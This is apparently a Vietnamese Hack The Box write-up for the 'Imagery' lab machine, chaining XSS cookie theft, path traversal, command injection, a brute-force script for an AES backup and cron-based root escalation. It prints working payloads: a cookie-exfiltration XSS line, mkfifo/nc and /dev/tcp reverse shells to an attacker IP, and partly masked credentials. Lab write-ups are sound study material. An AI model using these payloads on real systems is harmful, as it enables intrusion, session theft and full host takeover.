---
layout: post
author: Neo
title: Hackthebox - Imagery
image: /assets/img/2025-10-07-HTB-Imagery/intro.png
date: 2025-10-07
tags:
  - web
  - xss
  - lfi
  - command injection
  - burpsuite
  - python
  - brute-force
  - linux
  - hackthebox
categories: ctf
---
0. this unordered seed list will be replaced by toc as unordered list
{:toc}

## Reconnaissance and Scanning

```bash
rustscan -a 10.10.11.88 -- -sC -sV -oN nmap
```

```bash
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 9.7p1 Ubuntu 7ubuntu4.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 35:94:fb:70:36:1a:26:3c:a8:3c:5a:5a:e4:fb:8c:18 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKyy0U7qSOOyGqKW/mnTdFIj9zkAcvMCMWnEhOoQFWUYio6eiBlaFBjhhHuM8hEM0tbeqFbnkQ+6SFDQw6VjP+E=
|   256 c2:52:7c:42:61:ce:97:9d:12:d5:01:1c:ba:68:0f:fa (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBleYkGyL8P6lEEXf1+1feCllblPfSRHnQ9znOKhcnNM
8000/tcp open  http    syn-ack ttl 63 Werkzeug httpd 3.1.3 (Python 3.12.7)
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
|_http-title: Image Gallery
|_http-server-header: Werkzeug/3.1.3 Python/3.12.7
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Enumeration and Gaining access

Truy cập web với port 8000.

![](/assets/img/2025-10-07-HTB-Imagery/1.jpg)

Sử dụng `dirsearch` để bruteforce directory.

```bash
dirsearch -u 10.10.11.88:8000
```

```bash
  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/htb/machines/Imagery/reports/_10.10.11.88_8000/_25-10-07_12-41-40.txt

Target: http://10.10.11.88:8000/

[12:41:41] Starting: 
[12:42:23] 401 -   59B  - /images                                           
[12:42:30] 405 -  153B  - /login                                            
[12:42:31] 405 -  153B  - /logout                                           
[12:42:41] 405 -  153B  - /register                                         
[12:42:48] 401 -   32B  - /uploads/affwp-debug.log                          
[12:42:48] 401 -   32B  - /uploads/dump.sql                                 
                                                                             
Task Completed
```

### Cross-site scripting (XSS)

Kiểm tra trong source web có khá nhiều thông tin hữu ích: một số path đã được ẩn đi như `/admin` và nhiều path đằng sau nó.

![](/assets/img/2025-10-07-HTB-Imagery/3.jpg)

Trong `footer` của web có 1 path `/report_bug`.

![](/assets/img/2025-10-07-HTB-Imagery/4.jpg)

Sau khi thử nghiệm input một số payload độc hại, kết quả là phần input ở trang này bị dính lỗ hổng XSS, có thể lấy được cookie của `admin` thông qua payload này.

```bash
<img src=x onerror="document.location='http://<ATTACK_MACHINE_IP>:<PORT>/?cookie='+document.cookie">
```

Trước khi inject thì bật `netcat` để lấy được thông tin request.

```bash
nc -lnvp 80
```

Tiêm payload vào input.

![](/assets/img/2025-10-07-HTB-Imagery/5.jpg)

Quay trở lại `netcat`.

```bash
┌──(kali㉿kali)-[~/htb/machines/Imagery]
└─$ nc -lnvp 80
listening on [any] 80 ...
connect to [10.10.14.136] from (UNKNOWN) [10.10.11.88] 51804
GET /?cookie=session=.eJw9jbEOgzAMRP_Fc4UEZcpER74iMolLLSUGxc6AEP-Ooqod793T3QmRdU94zBEcYL8M4RlHeADrK2YWcFYqteg571R0EzSW1RupVaUC7o1Jv8aPeQxhq2L_rkHBTO2irU6ccaVydB9b4LoBKrMv2w.aOaXaw.Gm8IoGNdHX4ZGvxS6IpEQWB9rT0 HTTP/1.1
Host: 10.10.14.136
Connection: keep-alive
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/138.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://0.0.0.0:8000/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
```

Copy session này và truy cập vào `/admin/users`.

![](/assets/img/2025-10-07-HTB-Imagery/6.jpg)

### Local file inclusion (FLI)

Ngoài ra còn có có 1 path nữa để check log: `/admin/get_system_log?log_identifier=${encodeURIComponent(logIdentifier)}.log`. Tiêm một số payload vào path này để kiểm tra, kết quả là tồn tại lỗ hổng directory traversal.

![](/assets/img/2025-10-07-HTB-Imagery/7.jpg)

Tuy nhiên không lấy thêm được thông tin gì từ lỗ hổng này do các file cơ bản đều không xem được. Quay trở lại web và thay cookie của `admin` và cookie của user.

![](/assets/img/2025-10-07-HTB-Imagery/8.jpg)

Ấn `Save` và load lại trang, trang web sẽ hiển thị thêm `Admin Panel`.

![](/assets/img/2025-10-07-HTB-Imagery/9.jpg)

Quay trở lại Burp, mở file `env` của user hiện tại.

![](/assets/img/2025-10-07-HTB-Imagery/10.jpg)

Một số thông tin thu thập được từ `env`:

- User hiện tại: `web`
- Môi trường hiện tại: Môi trường ảo Python tại `/home/web/web/env/bin`
- Home: `/home/web`
- Shell: `/bin/bash`
- Giám sát memory của service `flaskapp.service` (ứng dụng Flask)

Nhờ Claude liệt kê một số tên file config của Flask có thể được sử dụng

![](/assets/img/2025-10-07-HTB-Imagery/11.jpg)

![](/assets/img/2025-10-07-HTB-Imagery/12.jpg)

`db.json`

![](/assets/img/2025-10-07-HTB-Imagery/13.jpg)

Password hash chỉ là MD5, một thuật toán mã hóa cực yếu. Dùng [Crackstation](https://crackstation.net/) để crack pasword.

Tôi có password của `testuser`. Login web với user mới tìm được.

### Command injection

Logic ban đầu của tôi là tìm kiếm tất cả POST requests để thực hiện inject trên các request này. Sau một thời gian tương đối dài khám phá web, tôi tìm thấy một lỗ hổng `Command Injection` trong phần chỉnh sửa ảnh.

Đầu tiên thực hiện upload ảnh. Quay lại ảnh vừa upload và chọn `Transform Image` 

![](/assets/img/2025-10-07-HTB-Imagery/16.jpg)

Chọn `Crop` &rarr; `Apply Transformation`.

Quay trở lại BurpSuite và lấy request này sang Repeater.

![](/assets/img/2025-10-07-HTB-Imagery/17.jpg)

Sau khi thử các payload của các lỗ hổng khác nhau, tôi tìm thấy `Command Injection` trong `x` param. 

![](/assets/img/2025-10-07-HTB-Imagery/18.jpg)

Khi tiêm 1 câu lệnh kèm ký tự đặc biệt, kết quả trả về lỗi `/bin/sh: 1: Syntax error`, chứng tỏ server đã xử lý câu lệnh. Thử các bypass filter.

![](/assets/img/2025-10-07-HTB-Imagery/19.jpg)

### Remote code execution (RCE)

Bật `netcat` listener trên máy kali với port tùy chọn.

```bash
nc -lnvp 9001
```

Sử dụng [Revshells.com](https://www.revshells.com/) để tạo reverhsell. Tôi sử dụng shell bên dưới với IP của máy kali và port đã lắng nghe bên trên.

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.7 9001 >/tmp/f
```

![](/assets/img/2025-10-07-HTB-Imagery/20.jpg)

Quay trở lại máy kali.

```bash
┌──(kali㉿kali)-[~/htb/machines/Imagery]
└─$ nc -lnvp 9001       
listening on [any] 9001 ...
connect to [10.10.14.7] from (UNKNOWN) [10.10.11.88] 36592
bash: cannot set terminal process group (1374): Inappropriate ioctl for device
bash: no job control in this shell
bash-5.2$ id
id
uid=1001(web) gid=1001(web) groups=1001(web)
bash-5.2$ 
```

Khai thác thông tin bên trong thư mục.

```bash
bash-5.2$ ls -la
ls -la
total 104
drwxrwxr-x 9 web  web   4096 Sep 22 18:56 .
drwxr-x--- 7 web  web   4096 Sep 22 18:56 ..
-rw-rw-r-- 1 web  web   9784 Aug  5 08:56 api_admin.py
-rw-rw-r-- 1 web  web   6398 Aug  5 08:56 api_auth.py
-rw-rw-r-- 1 web  web  11876 Aug  5 08:57 api_edit.py
-rw-rw-r-- 1 web  web   9091 Aug  5 08:57 api_manage.py
-rw-rw-r-- 1 web  web    840 Aug  5 08:58 api_misc.py
-rw-rw-r-- 1 web  web   3698 Sep 18 18:35 api_upload.py
-rw-rw-r-- 1 web  web   1943 Aug  5 15:21 app.py
drwxr-xr-x 2 root root  4096 Sep 22 18:56 bot
-rw-rw-r-- 1 web  web   1809 Aug  5 08:59 config.py
-rw-rw-r-- 1 web  web   3976 Oct 14 08:52 db.json
drwxrwxr-x 5 web  web   4096 Sep 22 18:56 env
drwxr-xr-x 2 web  web   4096 Sep 22 18:56 __pycache__
drwxr-xr-x 3 web  web   4096 Sep 22 18:56 static
drwxrwxr-x 2 web  web   4096 Oct 14 08:36 system_logs
drwxrwxr-x 2 web  web   4096 Sep 22 18:56 templates
drwxrwxr-x 3 web  web   4096 Oct 14 08:36 uploads
-rw-rw-r-- 1 web  web   4023 Aug  5 09:00 utils.py
```

```bash
bash-5.2$ ls -la bot
ls -la bot
total 16
drwxr-xr-x 2 root root 4096 Sep 22 18:56 .
drwxrwxr-x 9 web  web  4096 Sep 22 18:56 ..
-rwxr-xr-x 1 web  web  6899 Aug  2 19:56 admin.py
bash-5.2$ cat bot/admin.py
cat bot/admin.py
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import tempfile, shutil, time, traceback, uuid, os, glob

# ----- Config -----
CHROME_BINARY = "/usr/bin/google-chrome"
USERNAME = "admin@imagery.htb"
PASSWORD = "stro*****beach"
BYPASS_TOKEN = "K7Zg9vB$24NmW!q8xR0p%tL!"
APP_URL = "http://0.0.0.0:8000"
# ------------------

# Clean up old profiles
for folder in glob.glob("/tmp/chrome-profile-*"):
    try:
        shutil.rmtree(folder, ignore_errors=True)
    except Exception:
        pass

# Check /tmp space
total, used, free = shutil.disk_usage("/tmp")
if free < 50 * 1024 * 1024:
    print(f"[!] WARNING: /tmp is low on space! Only {free / 1024 / 1024:.2f} MB free.")

# Create new profile
user_data_dir = f"/tmp/chrome-profile-{uuid.uuid4()}"
os.makedirs(user_data_dir, exist_ok=True)

# Configure Chrome
options = Options()
options.binary_location = CHROME_BINARY
options.add_argument("--headless=new")
options.add_argument("--no-sandbox")
options.add_argument("--disable-dev-shm-usage")
options.add_argument(f"--user-data-dir={user_data_dir}")
options.set_capability("goog:loggingPrefs", {"browser": "ALL"})

....................
```

Ở đây tôi có thêm credential của `admin`. Tuy nhiên đến bước này rồi thì user này không còn quá quan trọng, chỉ lưu lại password biết đâu sẽ dùng được cho các phần tiếp theo.

Thử tìm tất cả các thư mục và file chứa một số đuôi nhạy cảm.

```bash
find / \( -iname "*id_rsa" -o -iname "*db" -o -iname "*sql" -o -iname "*key" -o -iname "*pem" -o -iname "*backup" -o -iname "*bak" -o -iname "*conf" \) 2>/dev/null
```

```bash
bash-5.2$ find / \( -iname "*id_rsa" -o -iname "*db" -o -iname "*sql" -o -iname "*key" -o -iname "*pem" -o -iname "*backup" -o -iname "*bak" -o -iname "*conf" \) 2>/dev/null
<" -o -iname "*bak" -o -iname "*conf" \) 2>/dev/null
/var/backup
/var/cache/debconf
/var/cache/man/ro/index.db
/var/cache/man/sr/index.db
/var/cache/man/fr/index.db
...............
```

```bash
bash-5.2$ cd /var/backup
cd /var/backup
bash-5.2$ ls -la
ls -la
total 22524
drwxr-xr-x  2 root root     4096 Sep 22 18:56 .
drwxr-xr-x 14 root root     4096 Sep 22 18:56 ..
-rw-rw-r--  1 root root 23054471 Aug  6  2024 web_20250806_120723.zip.aes
```

Bật http server trên máy này, lấy file này về máy kali để phân tích.

```bash
bash-5.2$ python3 -m http.server 4444
python3 -m http.server 4444

```

```bash
┌──(kali㉿kali)-[~/htb/machines/Imagery]
└─$ wget http://10.10.11.88:4444/web_20250806_120723.zip.aes
--2025-10-14 05:53:01--  http://10.10.11.88:4444/web_20250806_120723.zip.aes
Connecting to 10.10.11.88:4444... connected.
HTTP request sent, awaiting response... 200 OK
Length: 23054471 (22M) [application/octet-stream]
Saving to: ‘web_20250806_120723.zip.aes’

web_20250806_120723.zip.aes             100%[============================================================================>]  21.99M   120KB/s    in 2m 1s   

2025-10-14 05:55:02 (187 KB/s) - ‘web_20250806_120723.zip.aes’ saved [23054471/23054471]
```

Phân tích file này, đây là file mã hóa sử dụng AES, được tạo bởi `pyAesCrypt 6.1.1`

```bash
┌──(kali㉿kali)-[~/htb/machines/Imagery]
└─$ file web_20250806_120723.zip.aes 
web_20250806_120723.zip.aes: AES encrypted data, version 2, created by "pyAesCrypt 6.1.1"
```

Hỏi Claude về cách decrypt được file này và nhận được kết quả là sử dụng chính `pyAesCrypt` để giải mã.

Cài đặt `pyAesCrypt`

```bash
pip3 install pyaescrypt --break-system-packages
```

```bash
┌──(kali㉿kali)-[~/htb/machines/Imagery]
└─$ pyAesCrypt -h                                                                     
usage: pyAesCrypt [-h] [-o OUT] [-p PASSWORD] (-e | -d) filename

Encrypt/decrypt a file using AES256-CBC.

positional arguments:
  filename              file to encrypt/decrypt

options:
  -h, --help            show this help message and exit
  -o, --out OUT         specify output file
  -p, --password PASSWORD
                        specify the password
  -e, --encrypt         encrypt file
  -d, --decrypt         decrypt file
```

```bash
┌──(kali㉿kali)-[~/htb/machines/Imagery]
└─$ pyAesCrypt -d web_20250806_120723.zip.aes -o web_20250806_120723.zip          
Password:
Wrong password (or file is corrupted).
```

Thử với tất cả password mà tôi đã tìm được nhưng đều không có kết quả. Tôi sẽ viết 1 đoạn mã python đơn giản để thử brute-force password của file này.

```bash
nano aes_brute.py
```

```python
import pyAesCrypt
import sys

def decrypt(encrypted_file, password):
    try:
        pyAesCrypt.decryptFile(
            encrypted_file,
            "web_20250806_120723.zip",
            password,
            256 * 1024
        )
        return True
    except:
        return False

# Đọc wordlist
with open('/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt', 'r', encoding='latin-1') as f:
    for line in f:
        password = line.strip()
        print(f"Trying: {password}", end='\r')
        
        if decrypt('web_20250806_120723.zip.aes', password):
            print(f"\n[+] Password found: {password}")
            sys.exit(0)

print("\n[-] Password not found")
```

```bash
┌──(kali㉿kali)-[~/htb/machines/Imagery]
└─$ python aes_brute.py                                                  
Trying: be******ds
[+] Password found: be******ds
```

Thành công tìm được password, quay trở lại thực hiện decrypt file 

```bash
pyAesCrypt -d web_20250806_120723.zip.aes -o web_20250806_120723.zip -p 'be******ds'
```

Giải nén file zip

```bash
unzip web_20250806_120723.zip
```

Tôi nhận được thư mục `web` được backup.

```bash
┌──(kali㉿kali)-[~/htb/machines/Imagery/web]
└─$ ll
total 92
-rw-rw-r-- 1 kali kali  9784 Aug  5 08:56 api_admin.py
-rw-rw-r-- 1 kali kali  6398 Aug  5 08:56 api_auth.py
-rw-rw-r-- 1 kali kali 11876 Aug  5 08:57 api_edit.py
-rw-rw-r-- 1 kali kali  9091 Aug  5 08:57 api_manage.py
-rw-rw-r-- 1 kali kali   840 Aug  5 08:58 api_misc.py
-rw-rw-r-- 1 kali kali 12082 Aug  5 08:58 api_upload.py
-rw-rw-r-- 1 kali kali  1943 Aug  5 15:21 app.py
-rw-rw-r-- 1 kali kali  1809 Aug  5 08:59 config.py
-rw-rw-r-- 1 kali kali  1503 Aug  6 12:07 db.json
drwxrwxr-x 5 kali kali  4096 Oct 14 12:04 env
drwxrwxr-x 2 kali kali  4096 Oct 14 12:03 __pycache__
drwxrwxr-x 2 kali kali  4096 Oct 14 12:03 system_logs
drwxrwxr-x 2 kali kali  4096 Oct 14 12:03 templates
-rw-rw-r-- 1 kali kali  4023 Aug  5 09:00 utils.py
```

Trong file `db.json` tôi tìm thấy thêm thông tin đăng nhập của user `web` và `mark`

```bash
┌──(kali㉿kali)-[~/htb/machines/Imagery/web]
└─$ cat db.json 
{
    "users": [
        {
            "username": "admin@imagery.htb",
            "password": "5d9c1d507a3f76af1e5c97a3ad1eaa31",
            "displayId": "f8p10uw0",
            "isTestuser": false,
            "isAdmin": true,
            "failed_login_attempts": 0,
            "locked_until": null
        },
        {
            "username": "testuser@imagery.htb",
            "password": "2c65c8d7bfbca32a3ed42596192384f6",
            "displayId": "8utz23o5",
            "isTestuser": true,
            "isAdmin": false,
            "failed_login_attempts": 0,
            "locked_until": null
        },
        {
            "username": "mark@imagery.htb",
            "password": "01c3d2*************a367cf53e535",
            "displayId": "868facaf",
            "isAdmin": false,
            "failed_login_attempts": 0,
            "locked_until": null,
            "isTestuser": false
        },
        {
            "username": "web@imagery.htb",
            "password": "84e3c804***************f3da177e0",
            "displayId": "7be291d4",
            "isAdmin": true,
            "failed_login_attempts": 0,
            "locked_until": null,
            "isTestuser": false
        }
    ],
    "images": [],
    "bug_reports": [],
    "image_collections": [
        {
            "name": "My Images"
        },
        {
            "name": "Unsorted"
        },
        {
            "name": "Converted"
        },
        {
            "name": "Transformed"
        }
    ]
}                                              
```

Sử dụng `Crackstation` để crack 2 password này và thử switch user bằng password vừa tìm được.

```bash
bash-5.2$ id
id
uid=1001(web) gid=1001(web) groups=1001(web)
bash-5.2$ su mark
su mark
Password: s******sh
id
uid=1002(mark) gid=1002(mark) groups=1002(mark)
python3 -c 'import pty;pty.spawn("/bin/bash")'
bash-5.2$ cd
cd
bash-5.2$ ls -la
ls -la
total 24
drwxr-x--- 2 mark mark 4096 Sep 22 18:56 .
drwxr-xr-x 4 root root 4096 Sep 22 18:56 ..
lrwxrwxrwx 1 root root    9 Sep 22 13:21 .bash_history -> /dev/null
-rw-r--r-- 1 mark mark  220 Aug 20  2024 .bash_logout
-rw-r--r-- 1 mark mark 3771 Aug 20  2024 .bashrc
-rw-r--r-- 1 mark mark  807 Aug 20  2024 .profile
-rw-r----- 1 root mark   33 Oct 14 05:26 user.txt
bash-5.2$ 
```

## Privilege escalation

Lệnh đầu tiên mà tôi luôn thử `sudo -l`

```bash
bash-5.2$ sudo -l
sudo -l
Matching Defaults entries for mark on Imagery:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User mark may run the following commands on Imagery:
    (ALL) NOPASSWD: /usr/local/bin/charcol
```

Thử chạy file này

```bash
bash-5.2$ sudo /usr/local/bin/charcol help
sudo /usr/local/bin/charcol help
usage: charcol.py [--quiet] [-R] {shell,help} ...

Charcol: A CLI tool to create encrypted backup zip files.

positional arguments:
  {shell,help}          Available commands
    shell               Enter an interactive Charcol shell.
    help                Show help message for Charcol or a specific command.

options:
  --quiet               Suppress all informational output, showing only
                        warnings and errors.
  -R, --reset-password-to-default
                        Reset application password to default (requires system
                        password verification).
```

Đây chính là công cụ được sử dụng để mã hóa ra file aes mà tôi đã decrypt được ở phần trên. 

```bash
bash-5.2$ sudo /usr/local/bin/charcol shell
sudo /usr/local/bin/charcol shell

  ░██████  ░██                                                  ░██ 
 ░██   ░░██ ░██                                                  ░██ 
░██        ░████████   ░██████   ░██░████  ░███████   ░███████  ░██ 
░██        ░██    ░██       ░██  ░███     ░██    ░██ ░██    ░██ ░██ 
░██        ░██    ░██  ░███████  ░██      ░██        ░██    ░██ ░██ 
 ░██   ░██ ░██    ░██ ░██   ░██  ░██      ░██    ░██ ░██    ░██ ░██ 
  ░██████  ░██    ░██  ░█████░██ ░██       ░███████   ░███████  ░██ 
                                                                    
                                                                    
                                                                    
Charcol The Backup Suit - Development edition 1.0.0

[2025-10-14 16:19:52] [INFO] Entering Charcol interactive shell. Type 'help' for commands, 'exit' to quit.
charcol> help 
help
[2025-10-14 16:20:05] [INFO] 
Charcol Shell Commands:

  Backup & Fetch:
    backup -i <paths...> [-o <output_file>] [-p <file_password>] [-c <level>] [--type <archive_type>] [-e <patterns...>] [--no-timestamp] [-f] [--skip-symlinks] [--ask-password]
      Purpose: Create an encrypted backup archive from specified files/directories.
      Output: File will have a '.aes' extension if encrypted. Defaults to '/var/backup/'.
      Naming: Automatically adds timestamp unless --no-timestamp is used. If no -o, uses input filename as base.
      Permissions: Files created with 664 permissions. Ownership is user:group.
      Encryption:
        - If '--app-password' is set (status 1) and no '-p <file_password>' is given, uses the application password for encryption.
        - If 'no password' mode is set (status 2) and no '-p <file_password>' is given, creates an UNENCRYPTED archive.
      Examples:
        - Encrypted with file-specific password:
          backup -i /home/user/my_docs /var/log/nginx/access.log -o /tmp/web_logs -p <file_password> --verbose --type tar.gz -c 9
        - Encrypted with app password (if status 1):
          backup -i /home/user/example_file.json
        - Unencrypted (if status 2 and no -p):
          backup -i /home/user/example_file.json
        - No timestamp:
          backup -i /home/user/example_file.json --no-timestamp

    fetch <url> [-o <output_file>] [-p <file_password>] [-f] [--ask-password]
      Purpose: Download a file from a URL, encrypt it, and save it.
      Output: File will have a '.aes' extension if encrypted. Defaults to '/var/backup/fetched_file'.
      Permissions: Files created with 664 permissions. Ownership is current user:group.
      Restrictions: Fetching from loopback addresses (e.g., localhost, 127.0.0.1) is blocked.
      Encryption:
        - If '--app-password' is set (status 1) and no '-p <file_password>' is given, uses the application password for encryption.
        - If 'no password' mode is set (status 2) and no '-p <file_password>' is given, creates an UNENCRYPTED file.
      Examples:
        - Encrypted:
          fetch <URL> -o <output_file_path> -p <file_password> --force
        - Unencrypted (if status 2 and no -p):
          fetch <URL> -o <output_file_path>

  Integrity & Extraction:
    list <encrypted_file> [-p <file_password>] [--ask-password]
      Purpose: Decrypt and list contents of an encrypted Charcol archive.
      Note: Requires the correct decryption password.
      Supported Types: .zip.aes, .tar.gz.aes, .tar.bz2.aes.
      Example:
        list /var/backup/<encrypted_file_name>.zip.aes -p <file_password>

    check <encrypted_file> [-p <file_password>] [--ask-password]
      Purpose: Decrypt and verify the structural integrity of an encrypted Charcol archive.
      Note: Requires the correct decryption password. This checks the archive format, not internal data consistency.
      Supported Types: .zip.aes, .tar.gz.aes, .tar.bz2.aes.
      Example:
        check /var/backup/<encrypted_file_name>.tar.gz.aes -p <file_password>

    extract <encrypted_file> <output_directory> [-p <file_password>] [--ask-password]
      Purpose: Decrypt an encrypted Charcol archive and extract its contents.
      Note: Requires the correct decryption password.
      Example:
        extract /var/backup/<encrypted_file_name>.zip.aes /tmp/restored_data -p <file_password>

  Automated Jobs (Cron):
    auto add --schedule "<cron_schedule>" --command "<shell_command>" --name "<job_name>" [--log-output <log_file>]
      Purpose: Add a new automated cron job managed by Charcol.
      Verification:
        - If '--app-password' is set (status 1): Requires Charcol application password (via global --app-password flag).
        - If 'no password' mode is set (status 2): Requires system password verification (in interactive shell).
      Security Warning: Charcol does NOT validate the safety of the --command. Use absolute paths.
      Examples:
        - Status 1 (encrypted app password), cron:
          CHARCOL_NON_INTERACTIVE=true charcol --app-password <app_password> auto add \
          --schedule "0 2 * * *" --command "charcol backup -i /home/user/docs -p <file_password>" \
          --name "Daily Docs Backup" --log-output <log_file_path>
        - Status 2 (no app password), cron, unencrypted backup:
          CHARCOL_NON_INTERACTIVE=true charcol auto add \
          --schedule "0 2 * * *" --command "charcol backup -i /home/user/docs" \
          --name "Daily Docs Backup" --log-output <log_file_path>
        - Status 2 (no app password), interactive:
          auto add --schedule "0 2 * * *" --command "charcol backup -i /home/user/docs" \
          --name "Daily Docs Backup" --log-output <log_file_path>
          (will prompt for system password)

    auto list
      Purpose: List all automated jobs managed by Charcol.
      Example:
        auto list

    auto edit <job_id> [--schedule "<new_schedule>"] [--command "<new_command>"] [--name "<new_name>"] [--log-output <new_log_file>]
      Purpose: Modify an existing Charcol-managed automated job.
      Verification: Same as 'auto add'.
      Example:
        auto edit <job_id> --schedule "30 4 * * *" --name "Updated Backup Job"

    auto delete <job_id>
      Purpose: Remove an automated job managed by Charcol.
      Verification: Same as 'auto add'.
      Example:
        auto delete <job_id>

  Shell & Help:
    shell
      Purpose: Enter this interactive Charcol shell.
      Example:
        shell

    exit
      Purpose: Exit the Charcol shell.
      Example:
        exit

    clear
      Purpose: Clear the interactive shell screen.
      Example:
        clear

    help [command]
      Purpose: Show help for Charcol or a specific command.
      Example:
        help backup

Global Flags (apply to all commands unless overridden):
  --app-password <password>    : Provide the Charcol *application password* directly. Required for 'auto' commands if status 1. Less secure than interactive prompt.
  -p, "--password" <password>    : Provide the *file encryption/decryption password* directly. Overrides application password for file operations. Less secure than --ask-password.
  -v, "--verbose"                : Enable verbose output.
  --quiet                      : Suppress informational output (show only warnings and errors).
  --log-file <path>            : Log all output to a specified file.
  --dry-run                    : Simulate actions without actual file changes (for 'backup' and 'fetch').
  --ask-password               : Prompt for the *file encryption/decryption password* securely. Overrides -p and application password for file operations.
  --no-banner                   : Do not display the ASCII banner.
  -R, "--reset-password-to-default"  : Reset application password to default (requires system password verification).
                
charcol> 
```

Sau khi đọc và phân tích phần hướng dẫn của công cụ này, tôi để ý thấy phần `Automated Jobs (Cron)` cho phép chạy `--command` để đặt lịch thực hiện câu lệnh backup. Vậy thì thay bằng câu lệnh backup, tôi có thể thêm revershell vào đây.

Câu lệnh như bên dưới, với `--schedule` để đặt thời gian chạy lệnh, `--command` là câu lệnh thực thi và `--name` để đặt tên cho job này, cuối cùng thêm IP của máy kali và port tùy chọn.

```bash
auto add --schedule "* * * * *" --command "/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.7/7777 0>&1'" --name "RevShell"
```

Trước khi `Enter` thì bật listener trên máy kali.

```bash
nc -lnvp 7777
```

```bash
charcol> auto add --schedule "* * * * *" --command "/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.7/7777 0>&1'" --name "RevShell"         
<& /dev/tcp/10.10.14.7/7777 0>&1'" --name "RevShell"
[2025-10-14 16:36:59] [INFO] System password verification required for this operation.
Enter system password for user 'mark' to confirm: 
s*******sh

[2025-10-14 16:37:07] [INFO] System password verified successfully.
[2025-10-14 16:37:07] [INFO] Auto job 'RevShell' (ID: 2ff71144-4fca-41b8-a836-ef6d157eeea4) added successfully. The job will run according to schedule.
[2025-10-14 16:37:07] [INFO] Cron line added: * * * * * CHARCOL_NON_INTERACTIVE=true /bin/bash -c 'bash -i >& /dev/tcp/10.10.14.7/7777 0>&1'
```

Quay trở lại listener.

```bash
┌──(kali㉿kali)-[~/htb/machines/Imagery/web]
└─$ nc -lnvp 7777    
listening on [any] 7777 ...
connect to [10.10.14.7] from (UNKNOWN) [10.10.11.88] 40634
bash: cannot set terminal process group (175714): Inappropriate ioctl for device
bash: no job control in this shell
root@Imagery:~# id
id
uid=0(root) gid=0(root) groups=0(root)
root@Imagery:~# pwd
pwd
/root
root@Imagery:~# ls -la
ls -la
total 115212
drwx------  9 root root      4096 Oct 14 05:26 .
drwxr-xr-x 20 root root      4096 Sep 22 19:10 ..
lrwxrwxrwx  1 root root         9 Sep 22 13:21 .bash_history -> /dev/null
-rw-rw-r--  1 root root        81 Jul 30 08:10 .bash_profile
-rw-r--r--  1 root root      3187 Jul 30 08:10 .bashrc
drwxr-xr-x  4 root root      4096 Sep 22 18:56 .cache
drwxr-xr-x  2 root root      4096 Oct 14 14:03 .charcol
-rw-r--r--  1 root root 117907496 Aug  1 11:15 chrome.deb
drwx------  3 root root      4096 Sep 22 18:56 .config
drwxrwxr-x  3 root root      4096 Sep 22 18:56 .cron
-rw-------  1 root root        20 Sep 19 10:00 .lesshst
drwxr-xr-x  5 root root      4096 Sep 22 18:56 .local
drwx------  3 root root      4096 Sep 22 18:56 .pki
-rw-r-----  1 root root        33 Oct 14 05:26 root.txt
-rw-r--r--  1 root root        66 Sep 22 10:49 .selected_editor
drwx------  2 root root      4096 Sep 22 18:56 .ssh
-rw-r--r--  1 root root       165 Sep 22 13:21 .wget-hsts
root@Imagery:~# 
```